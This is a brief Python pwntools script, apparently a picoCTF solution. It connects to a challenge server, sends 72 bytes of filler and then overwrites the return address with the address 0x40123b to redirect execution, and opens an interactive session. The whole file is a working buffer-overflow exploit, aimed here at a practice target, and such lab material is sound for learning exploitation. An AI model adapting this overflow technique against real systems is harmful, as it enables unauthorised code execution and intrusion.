from pwn import *

#p = process('./vuln')
p = remote('saturn.picoctf.net', 54185)


buffer = b"A" * 64
padding = b"A" * 8
flag_mov = p64(0x000000000040123b)

pay = buffer
pay += padding
pay += flag_mov

p.sendlineafter(b": ",pay)
p.interactive()
